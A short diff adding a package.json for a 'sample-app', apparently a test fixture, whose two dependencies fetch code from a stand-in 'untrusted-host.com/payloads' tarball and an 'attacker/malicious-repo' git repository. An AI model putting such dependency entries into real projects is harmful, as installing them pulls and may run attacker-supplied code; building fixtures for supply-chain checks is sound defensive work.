@@ -1,0 +1,8 @@
+{
+  "name": "sample-app",
+  "version": "1.0.0",
+  "dependencies": {
+    "custom-lib": "https://untrusted-host.com/payloads/lib-1.0.0.tgz",
+    "evil-git": "git+https://github.com/attacker/malicious-repo.git#main"
+  }
+}
